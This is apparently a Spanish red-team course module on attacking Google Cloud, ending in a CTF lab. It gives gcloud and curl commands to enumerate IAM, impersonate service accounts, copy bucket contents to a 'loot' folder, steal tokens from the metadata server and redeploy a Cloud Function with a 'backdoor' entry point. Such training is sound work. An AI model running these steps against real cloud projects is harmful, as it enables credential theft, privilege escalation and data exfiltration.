# MCRTA – Módulo 5

# GCP Red Team Essentials

**Versión Markdown profesional**

---

## 1. Introducción al Módulo

Google Cloud Platform (GCP) es la tercera gran nube del mercado, ampliamente usada en entornos con Kubernetes, procesamiento distribuido y aplicaciones modernas basadas en contenedores.  
Para un operador Red Team, GCP ofrece oportunidades ofensivas muy interesantes:

- IAM extremadamente granular pero fácil de configurar mal.
    
- Service Accounts expuestos o con roles excesivos.
    
- Buckets GCS mal protegidos.
    
- Metadata server accesible desde VM comprometida.
    
- Rutas comunes de privilege escalation basadas en impersonación.
    

En este módulo aprenderás:

- Enumeración ofensiva completa de GCP.
    
- Identificación de roles peligrosos y cuentas expuestas.
    
- Abuso de Service Accounts (SA) y TokenCreator.
    
- Explotación de Cloud Storage, Compute Engine y Cloud Functions.
    
- Movimiento lateral basado en impersonación.
    
- CTF práctico para capturar flags en GCP.
    

---

## 2. Identidad en GCP

La identidad principal en GCP son las **Service Accounts**, no los usuarios humanos.  
Para saber quién eres realmente:

```
gcloud auth list
```

Salida esperada:

```
ACTIVE  ACCOUNT
*       user@example.com
```

Ver proyecto actual:

```
gcloud config get-value project
```

---

## 3. Enumeración Ofensiva Inicial

### 3.1 Obtener información completa del proyecto actual

```
gcloud projects describe $(gcloud config get-value project)
```

### 3.2 Listar Service Accounts

```
gcloud iam service-accounts list
```

Esto es clave: casi todos los ataques en GCP pasan por impersonación de SA.

### 3.3 Listar IAM Policy del proyecto

```
gcloud projects get-iam-policy <PROJECT_ID>
```

Aquí debes identificar:

- roles/owner
    
- roles/editor
    
- roles/iam.serviceAccountTokenCreator
    
- roles/storage.admin
    
- roles/cloudfunctions.admin
    

Cualquier SA con estos permisos es un objetivo prioritario.

---

## 4. Explotación de Service Accounts (SA)

Las SA son la identidad más poderosa de GCP.  
Un error común: asignar roles amplios a SA usadas por aplicaciones triviales.

### 4.1 Ver detalles de una SA

```
gcloud iam service-accounts describe <SA_EMAIL>
```

### 4.2 Listar claves de servicio expuestas

```
gcloud iam service-accounts keys list --iam-account <SA_EMAIL>
```

Si hay claves → exploitable.

### 4.3 Autenticación con clave JSON

Si obtienes una clave JSON:

```
gcloud auth activate-service-account \
  --key-file=<KEY.json>
```

### 4.4 Movimiento lateral usando impersonación

Si tu identidad tiene:

```
roles/iam.serviceAccountTokenCreator
```

Puedes generar tokens como cualquier SA:

```
gcloud iam service-accounts impersonate \
  <TARGET-SA>
```

Este permiso es una ruta de escalada muy común.

---

## 5. Enumeración y Explotación de Cloud Storage (GCS)

Cloud Storage es equivalente a S3 pero con controles diferentes.

### 5.1 Listar buckets

```
gcloud storage buckets list
```

### 5.2 Obtener IAM policy de un bucket

```
gcloud storage buckets get-iam-policy gs://<BUCKET>
```

Indicadores de exposición:

```
allUsers 
allAuthenticatedUsers
```

Si alguno aparece, el bucket es accesible.

### 5.3 Descargar el contenido de un bucket

```
gcloud storage cp -r gs://<BUCKET> ./loot/
```

---

## 6. Explotación de Compute Engine (GCE)

Cuando comprometes una VM en GCP, el objetivo es acceder al Metadata Server para robar tokens de SA.

### 6.1 Ver metadatos básicos

```
curl -H "Metadata-Flavor: Google" \
"http://169.254.169.254/computeMetadata/v1/"
```

### 6.2 Obtener token de la SA asociada

```
curl -H "Metadata-Flavor: Google" \
"http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
```

Salida:

```
{
  "access_token": "...",
  "expires_in": 3599,
  "token_type": "Bearer"
}
```

### 6.3 Usar el token para acceder a recursos

Ejemplo:

```
curl -H "Authorization: Bearer <TOKEN>" \
"https://storage.googleapis.com/storage/v1/b?project=<PROJECT_ID>"
```

Si la SA tiene permisos amplios → escalación inmediata.

---

## 7. Explotación de Cloud Functions y Cloud Run

### 7.1 Enumerar funciones

```
gcloud functions list
```

### 7.2 Ver SA asociada a una función

```
gcloud functions describe <FUNCTION_NAME>
```

Si la función tiene una SA privilegiada → secuestrar función = escalación.

### 7.3 Actualizar código de una función

```
gcloud functions deploy <FUNCTION_NAME> \
  --entry-point=backdoor \
  --runtime=python39 \
  --trigger-http \
  --source=./evil/
```

---

## 8. Rutas Comunes de Privilege Escalation en GCP

Las rutas técnicas más frecuentes:

### 8.1 Token Creator → Impersonación → Privilegios altos

Permiso crítico:

```
roles/iam.serviceAccountTokenCreator
```

Permite:

1. Generar tokens OAuth de cualquier SA.
    
2. Actuar como ella.
    
3. Explotar permisos más altos.
    

### 8.2 Storage Admin → Acceso a claves expuestas

```
roles/storage.admin
```

Si encuentras JSON de claves en un bucket, puedes autenticarse con ellas.

### 8.3 Cloud Functions Admin → ejecución arbitraria

Permite:

- subir backdoors
    
- ejecutar código privilegiado
    
- pivotar a otras SA asociadas
    

---

## 9. Movimiento Lateral en GCP

Ejemplo real:

1. **Comprometes una VM** con SA básica.
    
2. La SA tiene permiso de **TokenCreator** sobre otra SA.
    
3. Impersonas la SA con permisos superiores.
    
4. Descubres bucket con claves privadas.
    
5. Activas otra SA aún más privilegiada.
    
6. Llegas a Owner del proyecto.
    

La cadena es completamente plausible y ocurre frecuentemente en ambientes reales.

---

## 10. Laboratorio Práctico (CTF GCP)

### Flags del módulo

- **Flag 1:** Identificar una SA con TokenCreator o Owner.
    
- **Flag 2:** Obtener un token desde el metadata server.
    
- **Flag 3:** Descargar datos sensibles desde un bucket mal configurado.
    

### Comandos recomendados

Buscar SA peligrosas:

```
gcloud projects get-iam-policy <PROJECT> \
  --flatten="bindings[].members" \
  --format='table(bindings.role,bindings.members)'
```

Leer token:

```
curl -H "Metadata-Flavor: Google" \
"http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
```

Revisar buckets:

```
gcloud storage buckets list
```

---

## 11. Resumen Final del Módulo

En este módulo aprendiste:

- Cómo enumerar identidades, roles y permisos en GCP.
    
- Cómo identificar Service Accounts vulnerables.
    
- Técnicas de explotación del Metadata Server.
    
- Cómo abusar de impersonación y Token Creator.
    
- Cómo atacar GCS, Cloud Functions y Compute Engine.
    
- Rutas reales de escalación y movimiento lateral.
    
- Cómo capturar flags del laboratorio GCP.